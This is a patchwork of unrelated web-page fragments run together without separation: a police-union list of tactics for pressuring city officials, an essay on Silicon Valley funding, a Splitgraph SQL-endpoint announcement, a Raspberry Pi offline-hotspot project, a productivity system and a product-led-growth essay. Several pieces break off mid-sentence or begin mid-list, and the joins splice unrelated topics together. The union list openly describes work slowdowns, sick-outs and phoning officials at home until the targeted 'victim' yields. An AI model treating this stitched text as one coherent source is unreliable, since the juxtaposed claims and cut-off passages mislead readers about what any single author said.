<li><strong>Websites</strong> – <a href="http://gardengrovesucks.com/" rel="nofollow" target="_blank">GardenGroveSucks.com</a> was a big hit.</li>
<li><strong>Job Fair</strong> – Getting your members to apply at a large local agency, which causes an influx of personnel file checks by background investigators always sends a strong signal. Keep this for last, as some of your members may ultimately leave anyway.</li>
<li><strong>Work Slowdown</strong> – This involves informing your members to comply closely with Department policy and obey all speed limits. It also involves having members do thorough investigations, such as canvassing the entire neighborhood when taking a 459 report and asking for a back-up unit on most calls. Of course, exercising officer discretion in not issuing citations and making arrests is also encouraged.</li>
<li><strong>Blue Flu</strong> – This one is very rarely used and only in dire circumstances. As with all of these, please consult your association’s attorney before even discussing this issue with your members.</li>
<li><strong>Public Ridicule</strong> – Blunders by the City Manager, Mayor, or City Council members or wasteful spending should be highlighted and pointed out to the public at every opportunity.</li>
<li><strong>Referendum / Ballot Initiatives</strong> – Getting the public to vote for a wage increase is seldom going to fly, however, as a pressure tactic, seeking petition to file a referendum on eliminating the City Manager’s position for a full time elected mayor may cause the City Manager to rethink his or her position.</li>
<li><strong>Mailers</strong> – Again, the message should be for “public safety” in getting the public to attend city council meetings and to call the City Council members (preferably at home) to chastize them for their inaction.</li>
<li><strong>Campaigning</strong> – If any members of the governing body are up for election, the association should begin actively campaigning against them, again for their lack of concern over public safety. If you are in a non-election year, make political flyers which you can explain will be mailed out the following year during the election season.</li>
<li><strong>Focus on an Individual</strong> – Avoid spreading your energy. Focus on a city manager, councilperson, mayor or police chief and keep the pressure up until that person assures you his loyalty and then move on to the next victim.</li>
<li><strong>Press Conferences</strong> – Every high profile crime that takes place should result in the association’s uproar at the governing body for not having enough officers on the street, which could have avoided the incident.</li>
</ul>
<p>Of course, other ideas that cops come up with are very imaginative. Just keep in mind, the idea is to show the decision makers that the public favors public safety and it will only harm their public support by not prioritizing you and almost equally as important, to let them know that next time they should agree with you much sooner.</p>

<p>If you haven’t seen it in the news: it’s basically a giant tube that you sit inside of while you’re propelled hundreds of miles an hour to your destination. It’s sort of like the tube you put your checks in at the bank drive-thru… but instead of checks, it’s people.</p>
<p>It’s really cool, and it could easily disrupt airline and rail travel as we know it.</p>

<h3>A SIMPLE QUESTION</h3>
<p>As an entrepreneur, I began to wonder, “Why hasn’t anyone proposed this already?” It’s a great idea, but… Elon Musk can’t be the first person to think of it.</p>
<p>In doing some research online I found out that other American inventors have had <a title="Did Musk steal the idea for Hyperloop?" href="http://www.fastcoexist.com/3015704/futurist-forum/how-much-did-this-hyperloop-lookalike-inspire-elon-musk" target="_blank" rel="noopener" shape="rect">similar designs and proposals</a> for a decade. <b>However, none of them were able to get taken seriously or obtain funding.</b></p>
<p>Why did that happen?</p>
<p>I want to tell you my answer.</p>

<h3>MY THESIS</h3>
<p>My thesis is simple. We haven’t seen Silicon Valley develop a company like Hyperloop — even though the plans have been out there for over a decade — because there’s a systemic failure in the startup ecosystem. In short,&nbsp;<strong>Silicon Valley has killed major innovation.</strong></p>

<p>HAS THE VALLEY BECOME A BUNCH OF SHEEP?</p>
</div>
<p>In all of the hype around companies like Facebook and Instagram — what really are just glorified websites — we’ve lost sight of some real innovation opportunities, most of which occur in the offline world.</p>
<p><strong>The entire culture of Silicon Valley, and entrepreneurship around the globe, has taken on a groupthink</strong> that prevents truly novel inventions, like the Hyperloop, from reaching the market.</p>
<p>The result is a major loss. It’s a loss to our society. It’s a loss to our capital markets. It’s a loss to private investors. And it’s a loss to entrepreneurs.</p>

<h3>THIS IS A REALLY IMPORTANT QUESTION</h3>
<p>The title of this article is, “Why silicon valley funds Instagrams, not Hyperloops.” Note the plural. I’m not necessarily talking about Instagram in particular, or the Hyperloop in particular.</p>
<p>No, I’m asking a question: <strong>Why are we funding these really silly internet companies and not major life changing innovations?</strong> Why is it that all of my peers are inventing little dinky iPhone apps instead of planes, trains, and automobiles?</p>
<p>I feel like this is a really important question. Because, if as a country, America is going to continue to lead in innovation, we can’t be spending our time developing toys. <strong>We have to innovate innovation itself.&nbsp;</strong>In fact, I’m actually not the first person to bring this up. There are a lot of thinkers surrounding the entrepreneurial space who have been asking this same question: Why are so many startups today creating such meaningless products?</p>
<p><strong>I’m going to present nine theories as to why we’re funding Instagrams but not Hyperloops.</strong>&nbsp;By no means is this an exhaustive list. It’s just a place to start a conversation. Here we go:</p>

<h3>THEORY 1: THE IPO MARKET SUCKS</h3>
<p>We have an undesirable IPO market right now. It’s a bad time to take a company public.</p>
<p>A company like Hyperloop is too large to be an M&amp;A exit. It’s an IPO exit. So if you are going to make the Hyperloop, an investor’s going to ask, “How are we going to exit this investment?” The answer is, “An IPO.” And, right there, a lot of investors lose interest. To many, it would seem that making the Hyperloop might be easier than having a successful IPO!</p>
<p>In parallel commentary to this, please read Mark Cuban’s <a title="Mark Cuban's Stock Market blog post" href="http://blogmaverick.com/2010/08/20/the-stock-market-is-still-for-suckers-and-why-you-should-put-your-money-in-the-bank/" target="_blank" rel="noopener" shape="rect">post on the stock market</a>. It really got me thinking:</p>

<p>THE STOCK MARKET, CA. 1940</p>
</div>
<p><strong>The stock market used to be a place where entrepreneurs went and raised money for their companies.</strong> That’s what the stock market used to be. Today the stock market is a place where hedge fund managers and quant traders are shaving fractions of a penny off benign movements in price and volume. One of the byproducts of going from an entrepreneurial stock market to a hyper-traded stock market is that new companies can’t survive unless they have a market cap of at least $10 billion dollars. Don’t even bother going public with less than that. It’s not worth the time, or the money, or the effort.</p>
<p><strong>Furthermore, the stock market isn’t influenced by value today like it was thirty years ago.</strong> Whenever I bring this conversation up, I always ask people, “If AOL comes out with a phenomenal new product, is the stock price guaranteed to go up?” No, of course not. “If Kaiser Permanente releases a drug that cures all cancers, is the stock price guaranteed to go up?” No, of course not. The stock price goes up or down based on supply and demand. It only responds to human action. And, therefore, the price of a stock is solely determined by how people <i>think</i> about the price of a stock. There’s nothing that forces a company’s actual business value to drive the ticker price.</p>
<p>So when an investor says, “I don’t like investing in companies that have an IPO track,” he’s not crazy. It’s actually a very reasonable thing today — as a investor or an entrepreneur — to say, “I want to make a company that’s going to get acquired.” That’s really the most intelligent and reasonable strategy.</p>

<p>THE STOCK MARKET, CA. 2010</p>
</div>
<p><strong>But without a public equities market to which investors can exit early-stage investments, and where retail investors can buy stock in new companies that will continue to grow, inventions like the Hyperloop can’t go public.</strong> And if it can’t go public, it’s not exiting; and if it’s not exiting, no one is going to invest. Under these circumstances, the only way that the Hyperloop is ever developed is if someone like Elon Musk has enough capital of his own to finance it.</p>
<p>And that’s really a shame for America. We really need to look into that. We need to figure out how we’re going to make the IPO market better, because if we want to have innovative products, we have to repair the process of going public and make it appealing again. Right now, the only sane choice is to aim for an acquisition. But mergers and acquisitions are on average $100 million a piece. There’s no way to have a company as large as Hyperloop acquired because it’s a multi billion-dollar company. You just can’t do it. So, how are you going to exit? You can’t. And that’s one reason why it won’t get funded.</p>

<h3>THEORY 2: CONTEMPORARY PORTFOLIO STRATEGY FAVORS LAYUPS AND DISCOURAGES 3-POINTERS</h3>

<p>TRY TO HIT AS MANY STARTUPS AS POSSIBLE</p>
<p>There is a portfolio strategy in place by investors and incubators that promotes a shotgun approach as opposed to a sniper rifle approach. What does this mean? It means that early stage funds, super angels, and micro VC’s are primarily interested in investing $50,000 a piece in hundreds of different startups instead of investing $4,000,000 a piece in a select few. The shotgun portfolio strategy speculates that a few startups will be successful, and will pay for all of the losers. When the smoke clears, there’s some cream on top, and that’s your investment return.</p>
<p><strong>This isn’t always how it used to be. From the early days of venture capital through the 90’s, there was a sniper rifle approach.</strong>Investors were more thoughtful, plotting. They picked a couple winners that they really believed in.</p>
<p>But in the same way that our nation’s politics is driven by a belief system, so is our leading investment strategy. And the prime belief behind the shotgun approach is that, “You can’t pick winners. Picking winners is a fool’s errand.” And, therefore, the only sane approach is to weed out the losers and invest in as many potential winners as possible. Incubators like Y-Combinator and Dream It have perfected this approach.</p>
<p>I’m not saying it’s necessarily a bad approach.<strong>But I want to point out the sniper rifle approach also works.</strong> It got us companies like HP, Kentucky Fried Chicken, and Hyundai.</p>

<p>TRY TO HIT AS FEW STARTUPS AS POSSIBLE</p>
</div>
<p>Why does this matter for our discussion about Hyperloop? A shotgun approach is predicated on a lot of small investments by angels. Instead of an angel writing a $5 million check, an angel writes a $50,000 check. Well, a company like Hyperloop is going to take a first round from angels of at least $20 million just to produce a limited engineering proof-of-concept. <strong>If angels are investing on a shotgun approach, the size of the check isn’t there, plain and simple.</strong> A company like Hyperloop is too big — because when you’re investing with a shotgun method, you don’t want to get involved in big companies. You want to get involved in companies where $50,000 gets you pretty far. And those tend to be companies where the product is code. So for any investor that has a shotgun portfolio strategy, which is most, Hyperloop would be a horrible investment — totally outside of your investment parameters.</p>
<p>Entrepreneurs today — and maybe even Elon Musk twenty years ago, before Paypal, &nbsp;Tesla, and SpaceX — cannot get an angel to invest the necessary seed funds for a large company. It won’t happen, and the reason it won’t happen is because people are writing small checks.</p>
<p>Shotgun investors also do not spend all of their time on any one company. A venture that seems too crazy, or too big, must be brushed aside simply because <strong>the investor is operating on a<i>volume</i> investing system, not a <i>value</i>investing system</strong>. Hyperloop would take up quite a lot of an investor’s time. If you’re on a sniper rifle approach, you have that time. It’s simply a part of your investing methodology. But on a shotgun approach, your investing methodology is bulk. Therefore, it would be hard to even get taken seriously enough to schedule a meeting with a shotgun angel investor if you were presenting a company like Hyperloop. You’re going against the predominant portfolio strategy too much.</p>

<h3>THEORY 3: “WE DON’T FUND IDEAS”</h3>
<p>The next theory is one that — not just for Hyperloop, but for lots of other inventions — is stifling innovation.&nbsp;As I said earlier, in the same way that beliefs shape our political system, beliefs shape our entrepreneurial system.</p>
<p>A very prominent belief today is: “We don’t fund ideas. We don’t fund teams. We don’t fund pitch decks. We don’t fund business plans. So unless you’ve got a business with users , we’re not funding it.” It’s become this …</p></div></div></div>

It supports all read-only SQL constructs, including filters and aggregations. It even lets you run joins across distinct datasets.</p><p>In this post, we will give you a quick introduction to the DDN as well as discuss how it works behind the scenes and our plan for its future.</p><section><h3 id="usage">Usage</h3><section><h4 id="connecting">Connecting</h4><p>The endpoint is at <code>postgresql://data.splitgraph.com:5432/ddn</code>. You will need a Splitgraph API key and secret to access it.</p><p>You don't need to install anything to use the endpoint. If you go to your Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">account settings</a>, you can generate a pair of credentials. You can then plug them into your SQL client.</p><p>If you're already using the <a href="https://www.splitgraph.com/docs/architecture/sgr-client"><code>sgr</code> client</a> and had registered for Splitgraph before, you can check your <code>.sgconfig</code> file for the API keys. You can also upgrade your client to version 0.2.0 with <code>sgr upgrade</code> and run <code>sgr cloud sql</code> to get a libpq-compatible connection string.</p><p><a href="https://www.splitgraph.com/docs/getting-started/installation">Installing Splitgraph locally</a> will let you snapshot these datasets and use them in <a href="https://www.splitgraph.com/docs/concepts/splitfiles">Splitfiles</a>.</p><p>There are more setup methods available in <a href="https://www.splitgraph.com/docs/splitgraph-cloud/data-delivery-network">our documentation</a>. This includes connecting to Splitgraph with clients like DBeaver, BI tools like Metabase or Google Data Studio or even other databases through ODBC.</p></section><section><h4 id="workspaces">Workspaces</h4><p>When you connect to Splitgraph, your SQL client will show you some schemas. These are data repositories featured on our <a href="https://www.splitgraph.com/explore">explore page</a> as well as datasets that you upload to Splitgraph.</p><p>We call this feature "workspaces". It works by implementing the <a href="https://en.wikipedia.org/wiki/Information_schema" as="https://en.wikipedia.org/wiki/Information_schema">ANSI information schema</a> standard. We'll expand on workspaces more in the future. For example, we'll let you:</p><ul><li>bookmark repositories that you want to show up in your workspace</li><li>allow you to have multiple workspaces and manage access to them</li><li>search for Splitgraph repositories directly from your SQL client.</li></ul></section><section><h4 id="running-queries">Running queries</h4><p>You can run queries on Splitgraph images by referencing them as PostgreSQL schemata: <code>namespace/repository[:hash_or_tag]</code>. By default, we query the <code>latest</code> tag.</p><p>For example, if you want to query the <a href="https://www.splitgraph.com/cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc" as="https://www.splitgraph.com/cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc"><code>cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc</code> repository</a>, proxied by Splitgraph to <a href="https://data.cityofchicago.org/Health-Human-Services/COVID-19-Daily-Cases-and-Deaths/naz8-j4nc" as="https://data.cityofchicago.org/Health-Human-Services/COVID-19-Daily-Cases-and-Deaths/naz8-j4nc">Socrata</a>, you can run:</p><pre><code metastring=""><span>SELECT</span> <span>*</span> <span>FROM</span>
    <span>"cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc"</span><span>.</span>covid19_daily_cases_deaths_and_hospitalizations
</code></pre><p>We let you use SQL <code>SELECT</code> and <code>EXPLAIN</code> statements. You can use any SQL clauses, including group-bys, aggregations, filters and joins. Splitgraph pushes filters down to the origin data source.</p><p>This sample query that we used in our <a href="https://www.splitgraph.com/docs/ingesting-data/socrata#using-metabase-to-join-and-plot-data-from-multiple-data-portals" as="/docs/ingesting-data/socrata#using-metabase-to-join-and-plot-data-from-multiple-data-portals">Metabase demo</a> runs a JOIN between two datasets:</p><pre><code metastring=""><span>SELECT</span>

They let us perform query execution and planning across federated data sources. We wrote about <a href="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> before: they're powerful and underused!</p><p>We manage connections using a fork of <a href="https://www.pgbouncer.org/" as="https://www.pgbouncer.org">pgBouncer</a>, a PostgreSQL connection pooler. Our fork lets us perform authentication outside of PostgreSQL. We can issue and revoke API keys without having to manipulate database roles. Several inbound Splitgraph users can run queries as a single PostgreSQL user.</p><p>We also use pgBouncer to transform queries on the fly. We rewrite clients' introspection queries and let them reference Splitgraph images as PostgreSQL schemata.</p><p>Each client essentially operates within its own isolated virtual database. The obvious implementation of this would be spinning up one database per client. But our query transformations let us do this at a <strong>much lower infrastructure cost</strong>. We also use this feature to inspect and drop unwanted queries on the fly.</p><p>Finally, we use our own <code>sgr</code> client to orchestrate this. Splitgraph engines power the data delivery network. They manage foreign data wrapper instantiation and querying Splitgraph images via <a href="https://www.splitgraph.com/docs/large-datasets/layered-querying">layered querying</a>. In the future, we will use Splitgraph's <a href="https://www.splitgraph.com/docs/concepts/objects">storage format</a> to snapshot remote datasets or cache frequent queries.</p></section><section><h3 id="future-and-roadmap">Future and roadmap</h3><p>There are a lot of directions we would like to pursue with Splitgraph.</p><p>You will be able to use Splitgraph to <strong>replace some of your data lake or ETL pipelines</strong> and query the data at source. This is similar to the idea of "data virtualization". But, unlike other software in this space, Splitgraph uses an open PostgreSQL procotol. This makes it immediately compatible with most of your BI tools and dashboards. It won't lock you into a proprietary query language.</p><p>We will soon have the ability to add <a href="https://www.splitgraph.com/docs/splitgraph-cloud/external-repositories">external repositories</a> to public or on-premises Splitgraph data catalogs. You will be able to query any dataset indexed in this catalog over the single SQL endpoint or our <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a>. You will be able to even use these datasets in <a href="https://www.splitgraph.com/concepts/splitfiles">Splitfiles</a>. This will let you define reproducible transformations on your data, enrich it with public datasets and track lineage.</p><p>You will be able to use Splitgraph as an <strong>SQL firewall and a rewrite layer</strong>. You won't need to use views to set up access policies for your data warehouse. Data consumers won't need to manage credentials to disjoint data silos. Splitgraph can inspect proxied queries and enforce granular access policies on individual columns. It will even be able to do PII masking and access auditing.</p><p>The single SQL endpoint is well suited for a <strong>data marketplace</strong>. Data vendors currently ship data in CSV files or other ad-hoc formats. They have to maintain pages of instructions on ingesting this data. With Splitgraph, data consumers will be able to acquire and interact with data directly from their applications and clients.</p></section><section><h3 id="conclusion">Conclusion</h3><p>Today, we launched the Splitgraph Data Delivery Network. It's a seamless experience of a single database with thousands of datasets at your fingertips, compatible with most existing clients and BI tools.</p><p>If you wish to try it out, you can get credentials to access it in less than a minute: just head on to the <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">landing page</a>.</p><p>We're also building towards a <a href="https://www.splitgraph.com/about/company/private-cloud-beta">"Splitgraph Private Cloud" product</a> that will let setup your own private Splitgraph cluster, managed by us and deployed to the cloud region of your choice. <a href="mailto:support@splitgraph.com" as="mailto:support@splitgraph.com">Contact us</a> if you're interested!</p></section></div></article></section></div>]]>

August 21, 2020 | https://m0yng.uk/2020/08/The-Portable-Web/ | <a href="https://web.archive.org/web/*/https://m0yng.uk/2020/08/The-Portable-Web/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Recently I discovered some spare parts from past projects, and ended up with this, a battery powered Raspberry Pi Zero W. But what to do with it?</p>
<p><img src="https://m0yng.uk/images/2020/pizerowlipo.jpg" alt="A Green case with ZeroLipo Hat and LiPo cell connected"></p>
<p>A few ideas came to mind or were suggested, such as a portable DMR hotspot, POCSAG transmitter, and others. But one idea came together from a few other bits.</p>
<p>What if I could have a WiFi hotspot that served content, rather than the Internet? What if the Pi was an isolated network that followed me around?</p>
<h2 id="Basic-Setup"><a href="#Basic-Setup" title="Basic Setup"></a>Basic Setup</h2><p>The basic setup has the following parts</p>
<ul>
<li>An open WiFi hotspot (using <a href="https://github.com/billz/raspap-webgui" target="_blank" rel="noopener">RaspAP</a>)</li>
<li>A “Captive Portal” to introduce users to the “Network” (using <a href="https://github.com/nodogsplash/nodogsplash" target="_blank" rel="noopener">NoDogSplash</a>)</li>
<li>Lighttpd to host stuff on HTTP</li>
<li>dnsmasq to resolve domains to our Pi</li>
<li>USB network gadget mode to load content etc.</li>
</ul>
<p>I won’t go into detail of how this is configured, because it isn’t anything special. Basically I set a few domains to resolve to the fixed IP of the Pi, and lighttpd is set to serve static files from the PI’s SD.</p>
<p>When a user joins the network they are greeted with a page introducing the idea, and a button to connect. They should then be directed to the custom domain <code>home.portableweb</code> which provides some more info and links to services available on the Pi.</p>
<h2 id="What-can-it-do"><a href="#What-can-it-do" title="What can it do?"></a>What can it do?</h2><p>Not much, yet!</p>
<h3 id="My-website"><a href="#My-website" title="My website"></a>My website</h3><p>I have a full mirror of my website on the Pi. As it is all static html files this is really easy to do, I just copy the files to the Pi and it “Just Works”.</p>
<h3 id="Cheltenham-Amateur-Radio-Association-News-Archive"><a href="#Cheltenham-Amateur-Radio-Association-News-Archive" title="Cheltenham Amateur Radio Association News Archive"></a>Cheltenham Amateur Radio Association News Archive</h3><p>The CARA website is larger, and more complex. However, I have a simple page with some info on the club, and an archive of CARA News in PDF format.</p>
<h3 id="A-guestbook"><a href="#A-guestbook" title="A guestbook"></a>A guestbook</h3><p>I’ve made a very basic PHP guestbook that lets users read and post messages for me, and future users. It is very simple and just stores everything in a json file.</p>
<h3 id="USB-Sync"><a href="#USB-Sync" title="USB Sync"></a>USB Sync</h3><p>The Pi is configured to act as a USB network “gadget” when connected to another computer using the “data” USB port. This way I can run a small bash script that runs a handful of rsync commands to sync updates to the various “sites” to the Pi, and copy the guestbook off the Pi.</p>
<h2 id="But-Why"><a href="#But-Why" title="But Why?"></a>But Why?</h2><p>Honestly? Because I thought I could, but wasn’t sure, and it seemed fun.</p>
<p>Maybe you are reading this whilst connected to my “Portable Web”? If so, please put something in my guestbook and tell me what you think!</p>
<p>This is also a kind of experiment. It seems that every website these days has huge piles of javascript, tracking, cookies, adverts, and requires a farm of servers to make one page display. This is different, one tiny computer, no infrastructure, just you and me! That your access to the information goes away when the two of us are no longer close makes the experience mean more. Maybe. I don’t know, but it seemed worth exploring.</p>
<p>Being an open WiFi, and the impracticality of using HTTPS, everything is unencrypted. My guestbook has some security in that PHP filters out “bad stuff” the user submits, but basically this is all open. Which suits the experimental nature of amateur radio quite nicely. How long that will even be practical, I don’t know, I’m sure browsers will soon start warning users not to touch anything that isn’t HTTPS.</p>
<p>Are “portable webs” going to take over? I seriously doubt it.</p>
<p>Could they become a thing? Maybe? Has someone else already done this before, I’m sure they have! Could they be a fun way to provide more information at events, clubs, etc., maybe. (the <a href="https://google.github.io/physical-web/" target="_blank" rel="noopener">Physical Web</a> sort of does this, but in a more “cloud” way) Could I find a better name for it? I really wish I had done before using it so many times…</p>
<h2 id="What-next"><a href="#What-next" title="What next?"></a>What next?</h2><p>I want to add some more services to the Pi. Some ideas are:</p>
<ul>
<li>Telnet server to play Snakes and Ladders</li>
<li>Gopher server with similar content to the http stuff. I’d probably need to provide a gopher client too!</li>
<li>An e-paper display so I can see if there are new entries in the guestbook, connected users, etc.</li>
<li>Some live info on the Pi, such as uptime, for the users to see (as proof it really is real?)</li>
<li>Some basic contact logging software that would show what I’m doing when /P and then sync with my main log later</li>
<li>A “Portable Web Protocol” that can let units chat or something? Like StreetPass for the 3DS?</li>
<li>Improve the DNS so it catches non existent domains and returns you to some help, rather than just failing.</li>
<li>A way to trick Android (and others) to think they <em>DO</em> have Internet, so they don’t use use mobile data and ignore the Pi</li>
<li>More info on Amateur Radio, maybe clone Wikipedia? Some videos from Essex Ham?</li>
</ul>
<h2 id="Conclusion"><a href="#Conclusion" title="Conclusion"></a>Conclusion</h2><p>In the end, this is probably pointless and I’ll never have anyone spontaneously use it, and I doubt anyone else will try to replicate the idea.</p>
<p>However, it was fun to build, and with some hot glue to hold the wire and LiPo in place it looks pretty neat!</p>
<p><img src="https://m0yng.uk/images/2020/pizerowlipo-glued.jpg" alt="A Green case with ZeroLipo Hat and LiPo cell glued behind"></p>

        </p></div><div><p>I have written before about my
<a href="https://orbifold.xyz/inbox-zero.html">Inbox Zero</a>
methodology.
This is still what I practice,
but there is a lot more that helps me.</p>
<p>The concept behind "Universal Binary"
is that the only numbers that make sense
asymptotically are zero, one, and infinity.
Therefore, in order to prevent things from going
off into infinity,
there needs to be processes that keep everything
to either zero or one.</p>
<p>One:</p>
<ul>
<li>TODO list.</li>
<li>Calendar.</li>
<li>Time tracker.</li>
</ul>
<p>Zero:</p>
<ul>
<li>"Notes"</li>
<li>E-mails in inbox</li>
<li>Non-pinned open tabs</li>
<li>Floating tasks</li>
</ul>
<div id="one-todo-list">
<h2>One TODO List</h2>
<p>I have a single list that tracks everything I needed to do.
Be it a reminder to put a garbage bin in the car
or work on upgrading a dependency in production,
everything goes in the same place.</p>
<p>Sometimes this will not be where all the information is.
Many of the things I need to do for work,
for example,
require a link to our internal issue tracking system.
For open source tickets, I have a GitHub link.</p>
<p>But the important thing is that I don't go to GitHub or our internal
ticketing system to figure out what I need to do.
I have a single TODO list</p>
<p>Since I have <em>one</em> TODO list, it gets a lot of things. If my wife asks me to run an errand, it becomes a task. In my one-on-one meeting with my manager, if I make a commitment, it becomes a task. If a conference e-mails me to suggest I participate in the CFP, it becomes a task. The tasks accumulate fast.</p>
<p>Currently, I feel like I'm on top of things and not behind on anything. In this calm, smooth sailing situation, I have around 200 tasks in my list. If every time I opened my list, I would have to look through 200 items to figure out what I am doing, I would get frustrated.</p>
<p>Instead, I have appropriate filters on it. "Today and not related to work" when I am at home relaxing. "Overdue and related to work" when I get to the office in the morning, to see I dropped anything on the floor. "Things that are either not related to work or need to be done at home and due soon" for when I'm at home catching up in the evening.</p>
<p>As I mentioned, I use TODOist. I think it's perfectly reasonable.
However, there are a lot of equally reasonable alternatives.
What's not reasonable is anything that does not let you tag and filter.</p>
</div>
<div id="one-calendar">
<h2>One Calendar</h2>
<p>I have gotten all my calendars feeding into a single pane of glass,
which color-codes the source.
My calendars include:</p>
<ul>
<li>Work calendar (the feeding removes sensitive information)</li>
<li>A Trello board with the Calendar power-up for co-ordinating events with my family.</li>
<li>TODOist's due date/time calendar.</li>
<li>Personal calendar invites.</li>
<li>My "Daily schedule", which is where I try to document my plans for each hour
I am awake, by day of the week.</li>
</ul>
<p>I have a daily morning task to review the calendar for the day.</p>
</div>
<div id="one-time-tracker">
<h2>One Time Tracker</h2>
<p>I use Toggl. The coolest feature in Toggl is that the Firefox button integration
integrates with TODOist and GitHub, so I have a button that says
"start working on this".
Some of the things I do are not tracked at tasks.
As a horrible work-around, I have a Microsoft TO-DO pinned tab.
This does not violate the "One TODO list" motto,
because these are not tasks I ever plan to accomplish.
This are simply things I can activate as a "thing I am doing"
with one click: for example, "dinner" or "figuring out next task".</p>
<p>Since as long as I am alive I am doing "something",
my time tracker is always supposed to be ticking.
I also have a daily task to go over the tracked items
and fix spelling and add appropriate metadata so that
I have less pressure to do so when I start tasks.</p>
</div>
<div id="zero-notes">
<h2>Zero Notes</h2>
<p>A note is just some information that has no place.
Everything should have a proper place.
If I want to take down some information and not sure what is
its proper place,
then it goes in the TODO list.
The action item is "figure out where to put this."</p>
<p>I have a links file, where I put links.
I have a recipes GitHub repo, where I put recipes.
I have a "Notes" folder in Dropbox,
but the only notes that go there are things that I
need to be able to see immediately on my phone.
This means that every note should have an expiry date,
and after that they can be archived.</p>
<p>During the beforetimes, I would have flight information for trips
there, and the like.
In these times, sadly, this folder is mostly empty until the world
is right again.</p>
</div>
<div id="zero-unpinned-tabs">
<h2>Zero Unpinned Tabs</h2>
<p>Firefox has an amazing feature called "pinned tabs".
Pinned tabs are always left-most,
and only have their icon showing up.
My pinned tabs include my E-mail,
my Calendar, WhatsApp,
TODOist, and the Microsoft To-Do hack.</p>
<p>Other tabs get closed. Since many of my tasks generate a lot of open tabs,
when cross-referencing documentation, this is an easy reminder.
Whenever I can't see all tab titles, I close everything unpinned.
Anything that I hesitate to close gets converted to a task with the TODOist
browser extension and then closed.</p>
</div>
<div id="zero-e-mails">
<h2>Zero E-mails</h2>
<p>I have daily tasks to empty out my personal and work inbox.
Anything that can't be emptied in the time I allocated to doing that
gets converted to a task.</p>
</div>
<div id="zero-floating-tasks">
<h2>Zero Floating Tasks</h2>
<p>Tasks get created in "Inbox" with no "due date".
There is a daily task have that list have zero items.
Items can be non-floating by being assigned to a project
and having one of three things be true:</p>
<ul>
<li>It's marked <tt>@when:time_permitting</tt>, which is effectively equivalent to
"Archived".</li>
<li>It's marked <tt>@status:subtask</tt>, which means it is part of a bigger
task where it is managed.</li>
<li>It's marked with a specific day I plan to do it ("due date", but it does
not actually mean "due date").</li>
</ul>
</div>
<div id="work-in-progress-one-report">
<h2>(Work in Progress) One Report</h2>
<p>I am working on having one report that pulls via API integration from
Toggl, TODOist, and FastMail Calendar (CalDav) details for the past week
and summarizes them.
For example, how many things did I do without a task?
Did they make sense?
What was my calendar saying I did at the time?</p>
<p>I have a rough prototype, so now it is mostly debugging the logic
to make sure I am getting everything I expect and cleaning up the Look And Feel
so I can see as much as possible on one screen.
I am using Jupyter for that.</p>
</div>
<div id="summary">
<h2>Summary</h2>
<p>For some people, "small amounts of chaos" is a reasonable goal.
But for me, it's zero or infinity
Funneling everything to one TODO box allows emptying all the others.
Funneling everything to one calendar means only checking in one place
"what am I supposed to be doing".</p>

<p>You will need sales, but do you need a sales team to achieve revenue?</p>
<p>Let's say you are the founder of a new tech startup.&nbsp;</p>
<p>A few months back, you and a couple of friends (all developers) built an amazing tool and have now received Seed funding.&nbsp;</p>
<p>As a result, you're under some pressure to grow. You took a few million from some VCs here and there, and they want to see some results.</p>
<p>Since the realization of needing to grow hit you, you've started to lose some sleep.&nbsp;</p>
<p>Before, you were just a group of friends working your ass off to build an amazing product, with some revenue coming in from your immediate network. Now you actually have to focus on ramping up your sales.</p>
<p>You call in a founders meeting to discuss next steps, and a conclusion is reached: you can't spend all your budget on engineers, which is what you wanted to do.&nbsp;</p>
<p>Instead, you need to hire some Sales people. Or some Marketing people. Or both. Whoever can get you some users that pay for your product. Or do you? Could you invest in engineering instead to drive more revenue, and perhaps building a better company along the way?</p>
<h2 id="getting-people-to-pay-you"><a href="#getting-people-to-pay-you" aria-label="getting people to pay you permalink"></a>Getting People to Pay&nbsp;You</h2>
<p>VC funding or not, all startups will eventually need to get paid for what they do.&nbsp;</p>
<p>Irrespective of how cool your idea is, or how helpful it may be, if you're not getting money in, you can't push it forward.&nbsp;
You need customers.</p>
<p>Traditionally, there are two ways to do this: sales and marketing. They are not mutually exclusive, but one strategy or the other generally takes the lead in generating growth.  To understand them, it's helpful to refer to a funnel:</p>

<h3 id="marketing-led-growth-"><a href="#marketing-led-growth-" aria-label="marketing led growth  permalink"></a>Marketing-led Growth&nbsp;📈</h3>
<p>The goal of marketing is to increase the number of people going through the funnel. </p>
<p>The idea is to make your business be seen. But not just that - it's also about being seen by the right people and seen in a positive light.</p>
<p>This involves a wide variety of aspects, from branding, to social media, and, of course, ads. If this is done well, the customer should come to you, so you won't need to go after them.</p>
<h3 id="sales-led-growth-🤝"><a href="#sales-led-growth-%F0%9F%A4%9D" aria-label="sales led growth 🤝 permalink"></a>Sales-led Growth&nbsp;🤝</h3>
<p>Sales, on the other hand, is about improving the conversion between steps of the funnel. </p>
<p>In some ways, it is the opposite of Marketing, as you will often go after the customer, rather than try to make them come to you. This can be done in a variety of ways, from cold calls to leveraging leads.&nbsp;</p>
<p>Essentially, the assumption is that there are people out there who are willing to pay for your product, so you need to do your best to find them and get them to pay you.</p>
<h2 id="the-underrated-alternative"><a href="#the-underrated-alternative" aria-label="the underrated alternative permalink"></a>The Underrated Alternative</h2>
<p>There are various benefits to Sales-led and Marketing-led growth strategies, and they are still widely used today.&nbsp;</p>
<p>However, a new approach has been gaining traction in the past few years, called Product-led Growth (PLG).</p>
<h3 id="let-your-product-do-the-talking"><a href="#let-your-product-do-the-talking" aria-label="let your product do the talking permalink"></a>Let your product do the&nbsp;talking</h3>
<p>With Product-led Growth, the idea is that rather than bringing users through an active sales team or aggressive marketing campaigns, you just focus on building your product - and ensure you make it great.</p>
<p>The concept is based on the assumption that if you build something that is useful and works well, the users will eventually come to you as result... with a little push, of course.</p>
<p>As such, your primary objective should be to make something truly amazing, rather than portray your product as amazing (which is what great Sales and Marketing people can do).</p>
